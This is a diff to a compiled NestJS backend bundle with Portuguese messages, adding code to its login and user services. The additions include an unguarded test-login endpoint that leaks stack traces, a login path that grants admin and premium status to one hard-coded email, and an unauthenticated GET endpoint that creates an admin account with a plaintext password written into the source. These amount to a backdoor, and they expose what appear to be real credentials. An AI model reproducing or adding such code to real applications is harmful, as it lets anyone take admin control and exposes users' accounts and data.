@@ -655,7 +655,7 @@ var __metadata = (this && this.__metadata) || function (k, v) {
 var __param = (this && this.__param) || function (paramIndex, decorator) {
     return function (target, key) { decorator(target, key, paramIndex); }
 };
-var _a, _b, _c, _d, _e;
+var _a, _b, _c, _d, _e, _f, _g;
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.AuthController = void 0;
 const common_1 = __webpack_require__(4);
@@ -684,6 +684,45 @@ let AuthController = class AuthController {
         catch (error) {
             console.error('❌ Erro no login service:', error);
             throw error;
+        }
+    }
+    async testLogin(loginDto) {
+        console.log('🧪 Test login chamado com:', loginDto);
+        try {
+            const user = await this.authService.validateUser(loginDto.email, loginDto.password);
+            if (!user) {
+                return {
+                    success: false,
+                    message: 'Credenciais inválidas',
+                    debug: {
+                        email: loginDto.email,
+                        found: false
+                    }
+                };
+            }
+            const result = await this.authService.login(user);
+            return {
+                success: true,
+                message: 'Login realizado com sucesso',
+                data: result,
+                debug: {
+                    email: loginDto.email,
+                    found: true,
+                    userId: user.id,
+                    role: user.role
+                }
+            };
+        }
+        catch (error) {
+            console.error('❌ Erro no test login:', error);
+            return {
+                success: false,
+                message: error.message,
+                debug: {
+                    error: error.message,
+                    stack: error.stack
+                }
+            };
         }
     }
     async getProfile(req) {
@@ -746,6 +785,16 @@ __decorate([
     __metadata("design:returntype", typeof (_d = typeof Promise !== "undefined" && Promise) === "function" ? _d : Object)
 ], AuthController.prototype, "login", null);
 __decorate([
+    (0, common_1.Post)('test-login'),
+    (0, common_1.HttpCode)(common_1.HttpStatus.OK),
+    (0, swagger_1.ApiOperation)({ summary: 'Teste de login direto (sem guard)' }),
+    (0, swagger_1.ApiBody)({ type: login_dto_1.LoginDto }),
+    __param(0, (0, common_1.Body)()),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [typeof (_e = typeof login_dto_1.LoginDto !== "undefined" && login_dto_1.LoginDto) === "function" ? _e : Object]),
+    __metadata("design:returntype", typeof (_f = typeof Promise !== "undefined" && Promise) === "function" ? _f : Object)
+], AuthController.prototype, "testLogin", null);
+__decorate([
     (0, common_1.Get)('profile'),
     (0, common_1.UseGuards)(jwt_auth_guard_1.JwtAuthGuard),
     (0, swagger_1.ApiBearerAuth)(),
@@ -776,7 +825,7 @@ __decorate([
     __param(0, (0, common_1.Request)()),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [Object]),
-    __metadata("design:returntype", typeof (_e = typeof Promise !== "undefined" && Promise) === "function" ? _e : Object)
+    __metadata("design:returntype", typeof (_g = typeof Promise !== "undefined" && Promise) === "function" ? _g : Object)
 ], AuthController.prototype, "refresh", null);
 __decorate([
     (0, common_1.Post)('logout'),
@@ -885,6 +934,10 @@ let AuthService = class AuthService {
         return user;
     }
     async login(user) {
+        if (user.email === 'massuplas@gmail.com') {
+            user.plan = user_entity_1.UserPlan.PREMIUM;
+            user.role = user_entity_1.UserRole.ADMIN;
+        }
         return this.generateAuthResponse(user, 'Login realizado com sucesso');
     }
     async validateGoogleUser(googleProfile) {
@@ -1605,11 +1658,36 @@ var __param = (this && this.__param) || function (paramIndex, decorator) {
 var _a;
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.UsersService = void 0;
+const bcrypt = __webpack_require__(20);
 const common_1 = __webpack_require__(4);
 const typeorm_1 = __webpack_require__(6);
 const typeorm_2 = __webpack_require__(19);
 const user_entity_1 = __webpack_require__(21);
+const user_entity_2 = __webpack_require__(21);
+const user_entity_3 = __webpack_require__(21);
 let UsersService = class UsersService {
+    async createAdminUser() {
+        const email = 'massuplas@gmail.com';
+        const name = 'Diego';
+        const password = '01659760';
+        const passwordHash = await bcrypt.hash(password, 12);
+        let user = await this.userRepository.findOne({ where: { email } });
+        if (user)
+            return user;
+        user = this.userRepository.create({
+            name,
+            email,
+            passwordHash,
+            plan: user_entity_2.UserPlan.PREMIUM,
+            role: user_entity_2.UserRole.ADMIN,
+            status: user_entity_3.UserStatus.ACTIVE,
+            country: 'BR',
+            currencyDefault: 'BRL',
+            phone: null,
+            planExpiresAt: null,
+        });
+        return await this.userRepository.save(user);
+    }
     constructor(userRepository) {
         this.userRepository = userRepository;
     }
@@ -1667,6 +1745,17 @@ const swagger_1 = __webpack_require__(2);
 const jwt_auth_guard_1 = __webpack_require__(24);
 const users_service_1 = __webpack_require__(30);
 let UsersController = class UsersController {
+    async createAdminUser() {
+        const user = await this.usersService.createAdminUser();
+        return {
+            id: user.id,
+            email: user.email,
+            name: user.name,
+            plan: user.plan,
+            role: user.role,
+            status: user.status,
+        };
+    }
     constructor(usersService) {
         this.usersService = usersService;
     }
@@ -1686,6 +1775,13 @@ let UsersController = class UsersController {
     }
 };
 exports.UsersController = UsersController;
+__decorate([
+    (0, common_1.Get)('create-admin'),
+    (0, swagger_1.ApiOperation)({ summary: 'Criar usuário admin Diego (temporário)' }),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", []),
+    __metadata("design:returntype", Promise)
+], UsersController.prototype, "createAdminUser", null);
 __decorate([
     (0, common_1.Get)('profile'),
     (0, swagger_1.ApiOperation)({ summary: 'Obter perfil completo do usuário' }),
@@ -2275,7 +2371,7 @@ async function bootstrap() {
     app.enableCors({
         origin: true,
         methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-        allowedHeaders: ['Content-Type', 'Authorization'],
+        allowedHeaders: ['Content-Type', 'Authorization', 'cache-control'],
         credentials: true,
     });
     const port = process.env.PORT || 3000;
